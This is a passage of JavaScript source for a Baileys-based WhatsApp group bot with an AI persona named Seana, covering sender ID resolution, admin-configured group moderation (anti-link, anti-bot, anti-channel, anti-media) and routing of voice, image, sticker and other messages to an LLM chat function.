          if (_meta?.participants) {
            const _p = _meta.participants.find(p =>
              p.lid === senderJid ||
              (String(p.lid||'').replace(/:.*@/,'@') === senderJid) ||
              (String(p.id||'').replace(/:.*@/,'@').split('@')[0] === senderJid.split('@')[0])
            );
            if (_p?.id) {
              const _realJid = String(_p.id).replace(/:.*@/,'@'); // strip device suffix
              console.log(`[WA @lid sender] resolved ${senderJid} → ${_realJid}`);
              senderJid = _realJid;
            }
          }
        } catch(e) { console.error('[WA @lid sender resolve]', e.message); }
      }

      // Self-command: the sender is the linked account itself, even in a DM with someone else
      if (msg.key.fromMe && sock.user?.id) {
        senderJid = String(sock.user.id).replace(/:.*?@/, '@');
      }
      let senderNumber=senderJid.replace('@s.whatsapp.net','').replace(/\D/g,'');

      // ── LID → phone override ───────────────────────────────────────────────
      // When MY_WA_LID is set and the sender's digits match, they ARE the owner.
      // Override senderNumber/senderJid to the real phone so all DB lookups
      // (getUser, ensureOwnerRich, isOwner) resolve to the correct row.
      const _ownerPhone = MY_WA.replace(/\D/g,'');
      if (MY_WA_LID && senderNumber === MY_WA_LID) {
        console.log(`[WA owner LID] ${senderNumber}@lid → ${_ownerPhone} (MY_WA_LID match)`);
        senderNumber = _ownerPhone;
        senderJid    = _ownerPhone + '@s.whatsapp.net';
      }

      // replyJid: for @lid DMs use the resolved phone JID; groups and normal JIDs pass through unchanged
      const replyJid = jid.endsWith('@lid') ? senderJid : jid;
      const name=(msg.pushName||'someone').split(' ')[0];
      const msgKey=msg.key;
      const rawUserId='wa_'+senderNumber;
      if (isGroup && !msg.key.fromMe) { botTrackGroupMsg(jid, msg, senderNumber); jaTouch(jid, senderNumber); }
      const userId=resolveId(rawUserId);
      // ── PRIVATE MODE: suppress bot *replies* for non-owners, but group moderation always runs ──
      // Group protection (antilink, antiflood, no-bot, badword, etc.) is never paused by private mode.
      const _isPrivate = (kvGet('private_' + _abSessKey(sock)) === '1' || (isGroup && kvGet('privategrp_' + _abSessKey(sock) + '_' + jid) === '1'))
        && !msg.key.fromMe && !isOwner(userId) && !isOwner(rawUserId)
        && ![sock.user?.id, sock.user?.lid].map(_abDigits).filter(Boolean).includes(senderNumber);
      // Wrap in try/catch — if the user's DB row has a value > Number.MAX_SAFE_INTEGER
      // better-sqlite3 throws synchronously, which kills the entire message handler
      // for that sender. On error, nuke and recreate the row so they can use the bot again.
      try {
        getUser(userId, name);
      } catch(e) {
        console.error('[WA] getUser overflow for', userId, '—', e.message, '— resetting row');
        try { db.prepare('DELETE FROM users WHERE id=?').run(userId); getUser(userId, name); } catch(_){}
      }
      if (!msg.key.fromMe) trackVisitor('wa_'+senderNumber, 'whatsapp', !isGroup);
      // force=true: phone already confirmed to match MY_WA, bypass isOwner() ID check
      if(senderNumber===_ownerPhone) ensureOwnerRich(userId, name, true);

      let mentionedJids = [], quotedParticipant = null;
      try {
        const _mRes = await Promise.race([
          waLid.resolveMentions(sock, msg, isGroup, jid),
          _lidTimeout(3000),
        ]);
        if (_mRes) { mentionedJids = _mRes.mentioned || []; quotedParticipant = _mRes.quoted || null; }
      } catch(e) { console.error('[WA resolveMentions error]', e.message); }

      // ── Fallback: read raw contextInfo mentions directly from the message ──
      // waLid.resolveMentions can return [] when JIDs are in @lid format or
      // when the resolve times out — so we also pull from the raw Baileys fields.
      const _rawCtx = msg.message?.extendedTextMessage?.contextInfo
        || msg.message?.imageMessage?.contextInfo
        || msg.message?.videoMessage?.contextInfo
        || msg.message?.documentMessage?.contextInfo
        || {};
      const _rawMentions  = Array.isArray(_rawCtx.mentionedJid) ? _rawCtx.mentionedJid : [];
      const _rawQuoted    = _rawCtx.participant || _rawCtx.remoteJid || null;
      // Merge — dedup by string value
      let allMentionedJids = [...new Set([...mentionedJids, ..._rawMentions])];
      if (!quotedParticipant && _rawQuoted) quotedParticipant = _rawQuoted;

      // ── FIX: Resolve @lid mention JIDs to real phone JIDs ──────────────────
      // WhatsApp uses privacy-preserving @lid format for mentions in newer versions.
      // Admin commands (.kick, .ban, etc.) need @s.whatsapp.net JIDs to work.
      // Strategy: look up group participant list and match by lid field.
      if (isGroup && allMentionedJids.some(j => j.endsWith('@lid') || j.endsWith('@lid.us'))) {
        try {
          const _meta = await Promise.race([
            sock.groupMetadata(jid),
            new Promise(r => setTimeout(() => r(null), 3000)),
          ]);
          if (_meta?.participants) {
            allMentionedJids = allMentionedJids.map(mJid => {
              if (!mJid.endsWith('@lid') && !mJid.endsWith('@lid.us')) return mJid;
              // Match by lid field on participant
              const found = _meta.participants.find(p =>
                p.lid === mJid ||
                (p.id && p.id.replace('@s.whatsapp.net','') === mJid.replace(/@lid.*$/,''))
              );
              if (found?.id) return found.id;
              // Fallback: strip lid suffix and rebuild phone JID
              const digits = mJid.replace(/@lid.*$/,'').replace(/\D/g,'');
              return digits ? `${digits}@s.whatsapp.net` : mJid;
            });
            console.log(`[WA @lid fix] resolved mentions → ${JSON.stringify(allMentionedJids)}`);
          }
        } catch(e) { console.error('[WA @lid resolve]', e.message); }
      }
      // Also resolve quoted participant if it's a @lid
      if (quotedParticipant && (quotedParticipant.endsWith('@lid') || quotedParticipant.endsWith('@lid.us'))) {
        try {
          const _meta2 = await Promise.race([
            sock.groupMetadata(jid),
            new Promise(r => setTimeout(() => r(null), 2000)),
          ]);
          if (_meta2?.participants) {
            const found = _meta2.participants.find(p =>
              p.lid === quotedParticipant ||
              (p.id && p.id.replace('@s.whatsapp.net','') === quotedParticipant.replace(/@lid.*$/,''))
            );
            if (found?.id) quotedParticipant = found.id;
          }
        } catch(_) {}
      }

      // AFK check — if any mentioned person is AFK, announce it
      if (isGroup && allMentionedJids.length) {
        for (const mJid of allMentionedJids) {
          const mNum  = mJid.replace('@s.whatsapp.net','').replace(/\D/g,'');
          const mId   = resolveId('wa_'+mNum);
          const afkU  = mNum ? db.prepare('SELECT afk, afk_reason, display_name FROM aura_users WHERE user_id=?').get(mId) : null;
          if (afkU?.afk) {
            const mName = db.prepare('SELECT name FROM users WHERE id=?').get(mId)?.name || mNum;
            try { await sock.sendMessage(jid, { text: `💤 ${afkU.display_name || mName} is AFK: ${afkU.afk_reason || 'AFK'}` }); } catch(_) {}
          }
        }
      }
      // Baileys stores sock.user.id as "1234567890:12@s.whatsapp.net"
      // Strip the device suffix (:12) to get the canonical JID
      const rawBotId = sock.user?.id || '';
      const botJid   = rawBotId ? rawBotId.replace(/:.*?@/, '@') : '';
      const botNum   = botJid.replace('@s.whatsapp.net','').replace(/\D/g,'') || '';
      const jidDigits = (j) => String(j).replace(/\D/g,'');
      // Check all mentions including raw fallback; also check if text contains @botNum
      const botLidDigits = String(sock.user?.lid || '').replace(/:.*$/, '').replace(/\D/g, '');
      const isMentioned  = allMentionedJids.some(j =>
        (botLidDigits && jidDigits(j) === botLidDigits) ||
        j === botJid ||
        (botNum && jidDigits(j) === botNum) ||
        (botNum && jidDigits(j).includes(botNum))
      ) || (botNum && text.includes('@' + botNum));
      const isReplyToBot  = !!quotedParticipant && (quotedParticipant === botJid || (botNum && jidDigits(quotedParticipant) === botNum) || (botLidDigits && jidDigits(quotedParticipant) === botLidDigits));
      // Only trigger on her name when it is part of the message, not on every mention in conversation
      const nameTriggered = /\b(?:seana|chandra|shay|chanelle|seanie)\b/i.test(text);
      const botMentioned  = isMentioned || isReplyToBot || nameTriggered;
      console.log(`[WA mention debug] botJid=${botJid} botNum=${botNum} allMentions=${JSON.stringify(allMentionedJids)} isMentioned=${isMentioned} isReplyToBot=${isReplyToBot} nameTriggered=${nameTriggered}`);

      console.log(`[WA route] isGroup=${isGroup} isVoice=${isVoiceNote} isAudio=${isAudioFile} isImage=${isImage} isVideo=${isVideo} isDoc=${isDocument} isSticker=${isSticker} isContact=${isContact} isLocation=${isLocation} botMentioned=${botMentioned}`);

      const isCmd=text.startsWith('.') || text.startsWith('?');  // . and ? prefixes
      const _rawWord = text.split(/\s+/)[0];
      const cmdWord  = isCmd ? (_rawWord === '?' ? '?' : text[0]+text.slice(1).split(/\s+/)[0].toLowerCase()) : '';
      const waArgs=text.split(/\s+/).slice(1); // used by group admin commands

      const task=async()=>{
        try{

          if (isCmd && cmdWord === '.gsdebug' && isSudo(userId)) {
            const _on = (waArgs[0] || '').toLowerCase() !== 'off';
            _gsDbg.on = _on; _gsDbg.left = _on ? 12 : 0;
            await humanReplyWA(sock, replyJid, _on ? 'Noted. For the next dozen unusual group messages I will send their structure to my own chat. Have someone post to the group status now.' : 'Debugging off.', {msgKey, quotedMsg: msg});
            return;
          }

          // ── DM guard: Seana is GROUP-ONLY on WhatsApp — all DMs are silently ignored ──
          // Nobody gets a reply in DM (not even the owner). She acts as if she is not linked.
          if (!isGroup) {
            console.log(`[WA DM block] ${senderNumber} — DM silently ignored (group-only mode)`);
            return; // no reply, no reaction, total silence
          }

          // ── Group-status guard: delete the post AND everything else they posted, then remove them. No warning. ──
          if (isGroup && _isGroupStatusPost && !msg.key.fromMe && !isSudo(userId)) {
            try {
              const _gsG = getGroupSettings(jid);
              if (_gsG.antistatus_on) {
                const _metaG = await gtWaMeta(sock, jid);
                const _isAdm = gtWaIsAdmin(_metaG, senderJid) || gtWaIsAdmin(_metaG, msg.key.participant || '');
                if (!_isAdm) {
                  if (!gtWaBotIsAdmin(sock, _metaG)) {
                    console.warn(`[group-status] ${senderNumber} posted to the group status in ${jid} but I am not an admin — cannot delete or remove`);
                  } else {
                    await botPurgeAndKick(sock, jid, msg, senderJid, senderNumber, _metaG);
                  }
                  return;
                }
              }
            } catch (e) { console.error('[group-status guard]', e.message); }
          }

          // ── Group moderation gate: mute / anti-flood / bad-word filter / activity stats ──
          if (isGroup) {
            try {
              if (await captchaCheckMessage({ sock, jid, msg, senderJid, text })) return;
              if (await gtWaGate({ sock, jid, msg, senderJid, senderNumber, rawUserId, userId, name, text })) return;
            } catch (e) { console.error('[gtWaGate]', e.message); }
          }

          // ── No-Bot: block non-admin members from using third-party WhatsApp bots ──
          // Detects automated/bot-originated messages by checking Baileys device metadata.
          // Admins and the bot's own account are always exempt.
          if (isGroup && !msg.key.fromMe && !isGroupMod(userId)) {
            try {
              const _nbGs = getGroupSettings(jid);
              if (_nbGs.antibot_on) {
                // Detect bot-originated messages: Baileys exposes the sender's device class
                // via messageContextInfo. A message sent by an automated bot typically
                // comes from device class 0 (Web/API) with no real phone device ID,
                // or has the sender key distribution message flag (automation signal).
                const _msgCtxInfo = msg.message?.messageContextInfo;
                const _deviceListMeta = _msgCtxInfo?.deviceListMetadata;
                // Signal 1: sender device is Web/linked device with no real phone session (agentBit = 0, deviceBit = 0)
                const _senderKeyDist = !!msg.message?.senderKeyDistributionMessage;
                // Signal 2: message comes from a @s.whatsapp.net JID but sent via an automated agent
                // (device class 0 with no sender device metadata = API/bot tool)
                const _noSenderDevice = _deviceListMeta &&
                  typeof _deviceListMeta.senderAccountType === 'number' &&
                  _deviceListMeta.senderAccountType === 0 &&   // 0 = regular account used via API
                  _deviceListMeta.senderKeyHash === undefined;  // no key hash = no real phone
                // Signal 3: the message key has a participant but the JID is a @s.whatsapp.net
                // belonging to a known automated bot (e.g. 0@s.whatsapp.net, or status broadcast)
                const _isBotJid = /^0@/.test(senderJid) || /^status@/.test(jid);
                // Signal 4: message body is empty but has protocolMessage / reactionMessage from
                // automated agents — these are not normal human messages
                const _hasOnlyProto = !text && !!msg.message?.protocolMessage && !msg.message?.reactionMessage;

                const _isBotMsg = _senderKeyDist || _noSenderDevice || _isBotJid || _hasOnlyProto;

                if (_isBotMsg) {
                  const _nbMeta = await gtWaMeta(sock, jid).catch(() => null);
                  const _nbBotIsAdmin = _nbMeta ? gtWaBotIsAdmin(sock, _nbMeta) : false;
                  const _nbSenderIsAdmin = _nbMeta ? (gtWaIsAdmin(_nbMeta, senderJid) || gtWaIsAdmin(_nbMeta, msg.key.participant || '')) : false;

                  if (!_nbSenderIsAdmin) {
                    if (!_nbBotIsAdmin) {
                      // Remind once per hour
                      const _nbNoteKey = 'nbNote:' + jid;
                      if (!global._nbNoted) global._nbNoted = {};
                      if (!global._nbNoted[_nbNoteKey] || Date.now() - global._nbNoted[_nbNoteKey] > 3600000) {
                        global._nbNoted[_nbNoteKey] = Date.now();
                        await sock.sendMessage(jid, { text: '⚠️ *No-Bot* is ON but I am not a group admin — I cannot warn or remove bot users. Make me admin for this to work.' });
                      }
                    } else {
                      const _nbLimit = gtWarnLimit(jid);
                      const _nbWc = addWarning(jid, rawUserId, 'using a third-party bot', 'bot');
                      if (_nbWc >= _nbLimit) {
                        try {
                          await sock.groupParticipantsUpdate(jid, [senderJid], 'remove');
                          clearWarnings(jid, rawUserId);
                          await sock.sendMessage(jid, {
                            text: `🚫 *No-Bot*\n\n@${senderNumber} has been *removed*.\nReason: using a third-party WhatsApp bot in this group after ${_nbLimit} warning${_nbLimit !== 1 ? 's' : ''}.`,
                            mentions: [senderJid],
                          });
                          console.log(`[nobot] removed ${senderNumber} from ${jid} after ${_nbLimit} warnings`);
                        } catch (e) { console.error('[nobot kick]', e.message); }
                      } else {
                        await sock.sendMessage(jid, {
                          text: `⚠️ *No-Bot Warning ${_nbWc}/${_nbLimit}*\n\n@${senderNumber}, using a third-party bot is *not allowed* in this group.\n\nThis is warning *${_nbWc}* of *${_nbLimit}*. You will be removed if you continue.`,
                          mentions: [senderJid],
                        });
                        console.log(`[nobot] warned ${senderNumber} in ${jid} (${_nbWc}/${_nbLimit})`);
                      }
                    }
                  }
                }
              }
            } catch (e) { console.error('[nobot]', e.message); }
          }

          // ── Anti-link (runs FIRST, on text + captions + link previews + group-invite cards) ──
          // ── Anti media: delete NORMAL (non-view-once) pictures / videos from members ──
          // View-once media is allowed; only normally-sent pictures/videos are deleted.
          const _normalKind = (isImage && _voKind !== 'image') ? 'image' : (isVideo && _voKind !== 'video') ? 'video' : null;
          if (isGroup && _normalKind && !isCmd && !msg.key.fromMe && kvGet((_normalKind === 'image' ? 'antipicture_' : 'antivideo_') + jid) === '1') {
            try {
              if (!isGroupMod(userId)) {
                const _metaV = await gtWaMeta(sock, jid);
                const _admV = gtWaIsAdmin(_metaV, senderJid) || gtWaIsAdmin(_metaV, msg.key.participant || '');
                if (!_admV) {
                  if (gtWaBotIsAdmin(sock, _metaV)) {
                    try { await sock.sendMessage(jid, { delete: msg.key }); } catch (e) { console.error('[antimedia delete]', e.message); }
                    await humanReplyWA(sock, replyJid, `⚠️ @${senderNumber} ${_normalKind === 'image' ? 'pictures' : 'videos'} must be sent as *view-once* in this group.`, {mentionJids:[senderJid]});
                  } else {
                    const _vk = 'medianote:' + jid;
                    if (!global._alNoted) global._alNoted = {};
                    if (!global._alNoted[_vk] || Date.now() - global._alNoted[_vk] > 3600000) {
                      global._alNoted[_vk] = Date.now();
                      await humanReplyWA(sock, replyJid, '⚠️ Anti-media is on but I am not a group admin, so I cannot delete them. Make me admin.', {msgKey});
                    }
                  }
                  return;
                }
              }
            } catch (e) { console.error('[antimedia]', e.message); }
          }

          // ── Anti-channel: delete posts forwarded from a WhatsApp Channel (no link in the text, so anti-link can't see them) ──
          if (isGroup && !isCmd && !msg.key.fromMe && kvGet('antichannel_' + jid) === '1') {
            try {
              const _ctxs = Object.values(msg.message || {}).map(v => v && typeof v === 'object' ? v.contextInfo : null).filter(Boolean);
              // Check 1: direct channel forward (has forwardedNewsletterMessageInfo)
              const _directFromChannel = _ctxs.some(ci => ci.forwardedNewsletterMessageInfo) || !!msg.message?.newsletterAdminInviteMessage;
              // Check 2: poll message (pollCreationMessage / V2 / V3) — polls only come from channels
              const _isPoll = !!(msg.message?.pollCreationMessage || msg.message?.pollCreationMessageV2 || msg.message?.pollCreationMessageV3);
              // Check 3: multi-hop forward originally from a newsletter (remoteJid ends in @newsletter)
              const _multiHopFromChannel = _ctxs.some(ci => String(ci.remoteJid || '').endsWith('@newsletter'));
              const _fromChannel = _directFromChannel || _isPoll || _multiHopFromChannel;
              if (_fromChannel && !isGroupMod(userId)) {
                const _metaC = await gtWaMeta(sock, jid);
                const _isAdm = gtWaIsAdmin(_metaC, senderJid) || gtWaIsAdmin(_metaC, msg.key.participant || '');
                if (!_isAdm) {
                  if (!gtWaBotIsAdmin(sock, _metaC)) {
                    const _nk = 'acnote:' + jid;
                    if (!global._alNoted) global._alNoted = {};
                    if (!global._alNoted[_nk] || Date.now() - global._alNoted[_nk] > 3600000) {
                      global._alNoted[_nk] = Date.now();
                      await humanReplyWA(sock, replyJid, '⚠️ Anti-channel is on but I am not a group admin, so I cannot delete channel posts. Make me admin.', {msgKey});
                    }
                  } else {
                    try { await sock.sendMessage(jid, { delete: msg.key }); } catch (e) { console.error('[antichannel delete]', e.message); }
                    const _wc = addWarning(jid, rawUserId, 'channel forward', 'bot');
                    const _lim = gtWarnLimit(jid);
                    let _wm = `⚠️ @${senderNumber} channel forwards are not allowed here. (Warning ${_wc}/${_lim})`;
                    if (_wc >= _lim) {
                      try { await sock.groupParticipantsUpdate(jid, [senderJid], 'remove'); clearWarnings(jid, rawUserId); _wm = `🚫 @${senderNumber} was removed for repeated channel forwards.`; } catch (_) {}
                    }
                    await humanReplyWA(sock, replyJid, _wm, {mentionJids:[senderJid], msgKey});
                  }
                  return;
                }
              }
            } catch (e) { console.error('[antichannel]', e.message); }
          }

          if (isGroup && linkText && !isCmd && !msg.key.fromMe) {
            try {
              const _gsA = getGroupSettings(jid);
              if (hasLink(linkText)) {
                let _dAdm = '?', _dBot = '?';
                try { const _m = await gtWaMeta(sock, jid); _dAdm = gtWaIsAdmin(_m, senderJid) || gtWaIsAdmin(_m, msg.key.participant || ''); _dBot = gtWaBotIsAdmin(sock, _m); } catch (_) {}
                console.log(`[antilink] link from ${senderNumber} (${rawUserId}) | antilink_on=${!!_gsA.antilink_on} | sender_is_owner_or_sudo=${isSudo(userId)} | sender_is_group_admin=${_dAdm} | bot_is_admin=${_dBot}`);
              }
              if (_gsA.antilink_on && hasLink(linkText) && !isGroupMod(userId)) {
                const _metaA = await gtWaMeta(sock, jid);
                const _senderIsAdmin = gtWaIsAdmin(_metaA, senderJid) || gtWaIsAdmin(_metaA, msg.key.participant || '');
                if (!_senderIsAdmin) {
                  if (!gtWaBotIsAdmin(sock, _metaA)) {
                    // can't delete without admin rights — say so once an hour instead of failing silently
                    const _nk = 'alnote:' + jid;
                    if (!global._alNoted) global._alNoted = {};
                    if (!global._alNoted[_nk] || Date.now() - global._alNoted[_nk] > 3600000) {
                      global._alNoted[_nk] = Date.now();
                      await humanReplyWA(sock, replyJid, '⚠️ Anti-link is on but I am not a group admin, so I cannot delete links. Make me admin.', {msgKey});
                    }
                  } else {
                    try { await sock.sendMessage(jid, { delete: msg.key }); } catch (e) { console.error('[antilink delete]', e.message); }
                    const _wc = addWarning(jid, rawUserId, 'posted a link', 'bot');
                    const _lim = gtWarnLimit(jid);
                    let _wm = `⚠️ @${senderNumber} links are not allowed here. Only admins can send links. (Warning ${_wc}/${_lim})`;
                    if (_wc >= _lim) {
                      try { await sock.groupParticipantsUpdate(jid, [senderJid], 'remove'); clearWarnings(jid, rawUserId); _wm = `🚫 @${senderNumber} was removed for repeated link spam.`; } catch (_) {}
                    }
                    await humanReplyWA(sock, replyJid, _wm, {mentionJids:[senderJid], msgKey});
                  }
                  return;
                }
              }
            } catch (e) { console.error('[antilink]', e.message); }
          }

          // ── Sticker pack controls (owner only) ──────────────────────
          if (isCmd && (cmdWord === '.stickerpack' || cmdWord === '.addsticker' || cmdWord === '.stickers' || cmdWord === '.font' || cmdWord === '.autosticker')) {
            if (!isSudo(userId)) { await humanReplyWA(sock, replyJid, 'Only my owner may touch the collection.', {msgKey, quotedMsg: msg}); return; }
            const _send = (t) => humanReplyWA(sock, replyJid, t, {msgKey, quotedMsg: msg});
            const _count = () => { try { return fs.readdirSync(STICKER_DIR).filter(f => f.endsWith('.webp')).length; } catch (_) { return 0; } };
            { const _r = botSettingsCmd(cmdWord, waArgs[0]); if (_r) { await _send(_r); return; } }
            if (cmdWord === '.stickers') { await _send(botStickersStatus()); return; }
            if (cmdWord === '.stickerpack') {
              const name = (waArgs[0] || '').trim().replace(/^.*addstickers\//, '');
              if (!name || !/^[A-Za-z0-9_]{3,64}$/.test(name)) { await _send('Usage: .stickerpack <name>\nTake the name from a Telegram link: t.me/addstickers/NAME. Picture and video packs both work (animated .tgs ones are skipped). It replaces the current pack.'); return; }
              try {
                const n = await botLoadPack(name);
                await _send(_packReport(n, name));
              } catch (e) { await _send('Failed: ' + e.message); }
              return;
            }
            // .addsticker — must be a reply to a sticker
            try {
              const _ci = msg.message?.extendedTextMessage?.contextInfo;
              const _qs = _ci?.quotedMessage?.stickerMessage;
              if (!_qs) { await _send('Reply to a sticker with .addsticker.'); return; }
              const _qmsg = { key: { remoteJid: jid, id: _ci.stanzaId, participant: _ci.participant }, message: _ci.quotedMessage };
              const _buf = await downloadMediaMessage(_qmsg, 'buffer', {}, { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
              if (!botAddStickerBuf(_buf)) { await _send('That one is not a usable static sticker.'); return; }
              await _send(`Added. The collection now holds ${_count()} stickers.`);
            } catch (e) { await _send('Could not save it: ' + e.message); }
            return;
          }

          // ── VOICE NOTE ─────────────────────────────────────────────
          // Always answer a voice note with a voice note back, and never echo the transcript text.
          if(isVoiceNote){
            // Group: only respond if the bot is tagged/mentioned/replied-to, just like video/document/sticker.
            if(isGroup && !botMentioned) return;
            try{
              const _vb = await downloadMediaMessage(msg,'buffer',{},{ logger:pino({level:'silent'}), reuploadRequest: sock.updateMediaMessage });
              const _tr = await transcribeAudio(_vb, msg.message.audioMessage.mimetype||'audio/ogg');
              if(!_tr){
                await humanReplyWA(sock,replyJid,'...i heard you but couldn\'t make out the words.',{msgKey, quotedMsg:msg});
                return;
              }
              const _rp = await chat(userId, _tr);
              if(await sendVoiceWA(sock, replyJid, _rp, msg, msgKey)) return;
              // Voice synthesis failed — fall back to plain text, still no transcript echo.
              await humanReplyWA(sock,replyJid,_rp,{msgKey, quotedMsg:msg});
            }catch(e){
              console.error('[WA voice error]',e.message);
              await humanReplyWA(sock,replyJid,'...couldn\'t process that voice note.',{msgKey, quotedMsg:msg});
            }
            return;
          }

          // ── IMAGE ──────────────────────────────────────────────────
          if(isImage){
            const imgCaption = msg.message.imageMessage.caption||'';
            // sticker — convert image to WhatsApp sticker (natural: "sticker")
            if(/^\s*\.?sticker\s*$/i.test(imgCaption)){
              try{
                const buf = await downloadMediaMessage(msg,'buffer',{},{ logger:pino({level:'silent'}), reuploadRequest: sock.updateMediaMessage });
                await sock.sendMessage(replyJid,{text:'🎨 converting to sticker…'},{quoted:msg});
                const stickerBuf = await convertToSticker(buf,'image');
                await sock.sendMessage(replyJid,{sticker:stickerBuf},{quoted:msg});
              }catch(e){ await humanReplyWA(sock,replyJid,`❌ sticker failed: ${e.message}`,{msgKey,quotedMsg:msg}); }
              return;
            }
            // setpfp — owner saves this image as her profile pic (natural: "setpfp")
            if(/^\s*\.?setpfp\s*$/i.test(imgCaption) && isOwner(rawUserId)){
              try{
                const buf = await downloadMediaMessage(msg,'buffer',{},{ logger:pino({level:'silent'}), reuploadRequest: sock.updateMediaMessage });
                fs.writeFileSync(BOT_PFP_PATH, buf);
                await humanReplyWA(sock,replyJid,'📸 done. that\'s my picture now.',{msgKey, quotedMsg:msg});
              }catch(e){ await humanReplyWA(sock,replyJid,`❌ ${e.message}`,{msgKey, quotedMsg:msg}); }
              return;
            }
            // Group: never comment on pictures nobody asked her about (only when tagged, named, or replied to)
            if(isGroup && !botMentioned) return;
            await humanReplyWA(sock,replyJid,async()=>{
              try{
                console.log('[WA image] downloading image...');
                const buf = await downloadMediaMessage(msg,'buffer',{},{ logger:pino({level:'silent'}), reuploadRequest: sock.updateMediaMessage });
                const reply = await analyseImage(buf, imgCaption, name);
                return reply || '...i see it.';
              }catch(e){ console.error('[image error]',e.message); return '...couldn\'t see that image clearly.'; }
            },{msgKey, quotedMsg:msg});
            return;
          }

          // ── AUDIO FILE (non-voice, e.g. mp3 shared as file) ────────
          if(isAudioFile){
            if(isGroup && !botMentioned) return;
            await humanReplyWA(sock,replyJid,async()=>{
              try{
                console.log('[WA audio] downloading audio file...');
                const buf = await downloadMediaMessage(msg,'buffer',{},{ logger:pino({level:'silent'}), reuploadRequest: sock.updateMediaMessage });
                const mime = msg.message.audioMessage?.mimetype||'audio/mp4';
                const transcript = await transcribeAudio(buf, mime);
                if(!transcript) return '...got that audio file. couldn\'t make out the words though.';
                const reply = await chat(userId, transcript);
                return `🎵 "${transcript}"\n\n${reply}`;
              }catch(e){ console.error('[audio file error]',e.message); return '...couldn\'t process that audio file.'; }
            },{msgKey, quotedMsg:msg});
            return;
          }

          // ── VIDEO ──────────────────────────────────────────────────
          if(isVideo){
            const videoCaption = msg.message.videoMessage?.caption||'';
            // sticker — convert video to animated WebP sticker (natural: "sticker")
            if(/^\s*\.?sticker\s*$/i.test(videoCaption)){
              try{
                const buf = await downloadMediaMessage(msg,'buffer',{},{ logger:pino({level:'silent'}), reuploadRequest: sock.updateMediaMessage });
                await sock.sendMessage(replyJid,{text:'🎬 converting video to sticker (up to 6 s)…'},{quoted:msg});
                const stickerBuf = await convertToSticker(buf,'video');
                await sock.sendMessage(replyJid,{sticker:stickerBuf},{quoted:msg});
              }catch(e){ await humanReplyWA(sock,replyJid,`❌ sticker failed: ${e.message}`,{msgKey,quotedMsg:msg}); }
              return;
            }
            // Group: only respond if bot is mentioned
            if(isGroup && !botMentioned) return;
            await humanReplyWA(sock,replyJid,async()=>{
              try{
                const caption = msg.message.videoMessage?.caption||'';
                const input = caption
                  ? `[${name} sent a video and said: "${caption}". React naturally and briefly.]`
                  : `[${name} sent you a video. React naturally and briefly.]`;
                return await chat(userId, input);
              }catch(e){ return '...not watching that right now.'; }
            },{msgKey, quotedMsg:msg});
            return;
          }

          // ── DOCUMENT ───────────────────────────────────────────────
          if(isDocument){
            if(isGroup && !botMentioned) return;
            await humanReplyWA(sock,replyJid,async()=>{
              try{
                const docName = msg.message.documentMessage?.fileName||'a file';
                const caption = msg.message.documentMessage?.caption||'';
                const input = caption
                  ? `[${name} sent a document called "${docName}" and said: "${caption}". React naturally and briefly.]`
                  : `[${name} sent you a document called "${docName}". React naturally and briefly.]`;
                return await chat(userId, input);
              }catch(e){ return '...what am i supposed to do with this.'; }
            },{msgKey, quotedMsg:msg});
            return;
          }

          // ── STICKER ─────────────────────────────────────────────────


          if(isSticker){
            autoSaveWaSticker(sock, msg).catch(()=>{});   // collect it for later
            // In groups only reply when bot is mentioned, just like video/document
            if(isGroup && !botMentioned) return;
            const stickerPath = getRandomStickerPath();
            if (stickerPath) {
              // Reply with a random sticker from her pack
              try {
                await sleep(randomInt(1000, 2000));
                await sock.sendPresenceUpdate('composing', jid);
                await sleep(randomInt(800, 1500));
                await sock.sendPresenceUpdate('paused', jid);
                await sock.sendMessage(replyJid, {
                  sticker: fs.readFileSync(stickerPath),
                  mimetype: 'image/webp',
                }, { quoted: msg });
              } catch(e) {
                console.error('[sticker send]', e.message);
                // Fallback to text if sticker send fails
                await humanReplyWA(sock, replyJid, 'A sticker. How expressive.', {msgKey, quotedMsg:msg});
              }
            } else {
              // No stickers cached yet — respond in character
              await humanReplyWA(sock, replyJid, async()=>{
                try { return await chat(userId,'[person sent a sticker. react briefly, in character]'); }
                catch(e){ return 'A sticker. How expressive.'; }
              },{msgKey, quotedMsg:msg});
            }
            return;
          }

          // ── CONTACT CARD ─────────────────────────────────────────────
          if(isContact){
            if(isGroup) return;
            await humanReplyWA(sock,replyJid,async()=>{
              try{
                const contactName = msg.message.contactMessage?.displayName
                  || msg.message.contactsArrayMessage?.contacts?.[0]?.displayName
                  || 'someone';
                return await chat(userId,`[${name} just shared a contact card for "${contactName}". React naturally and briefly.]`);
              }catch(e){ return '...why are you sending me contacts.'; }
            },{msgKey, quotedMsg:msg});
            return;
          }

          // ── LOCATION ─────────────────────────────────────────────────
          if(isLocation){
            if(isGroup) return;
            await humanReplyWA(sock,replyJid,async()=>{
              try{
                const locName = msg.message.locationMessage?.name
                  || msg.message.locationMessage?.address
                  || msg.message.liveLocationMessage?.address
                  || 'somewhere';
                return await chat(userId,`[${name} shared their location: "${locName}". React naturally and briefly.]`);
              }catch(e){ return '...okay and?'; }
            },{msgKey, quotedMsg:msg});
            return;
          }

          // ── Anti-link check ──────────────────────────────────────────
          if (isGroup && text && !isSudo(userId) && !isCmd) {
            const gs = getGroupSettings(jid);
            if (gs.antilink_on && hasLink(text)) {
              // Allow group admins to send links freely
              const senderIsAdmin = await isGroupAdmin(sock, jid, senderJid);
              if (!senderIsAdmin) {
                try { await sock.sendMessage(jid, { delete: msg.key }); } catch(_){}
                const warnCount = addWarning(jid, rawUserId, 'posted a link', 'bot');
                const _alLimit = gtWarnLimit(jid);
                let warnMsg = `⚠️ @${senderNumber} links are not allowed here. Only admins can send links. (Warning ${warnCount}/${_alLimit})`;
                if (warnCount >= _alLimit) {
                  try {
                    await sock.groupParticipantsUpdate(jid, [senderJid], 'remove');
                    clearWarnings(jid, rawUserId);
                    warnMsg = `🚫 @${senderNumber} was removed for repeated link spam.`;
                  } catch(_){}
                }
                await humanReplyWA(sock, replyJid, warnMsg, {mentionJids:[senderJid], msgKey, quotedMsg:msg});
                return;
              }
            }
          }

          // ── Anti-GM check (group mention / status tag) ────────────────
          if (isGroup && !isSudo(userId) && !msg.key.fromMe) {
            const gs_gm = getGroupSettings(jid);
            if (gs_gm.antigm_on) {
              const isGroupMention = !!(
                msg.message?.groupMentionedMessage || msg.message?.groupStatusMentionMessage || msg.message?.statusMentionMessage ||
                msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.some(j => j.endsWith('@g.us')) ||
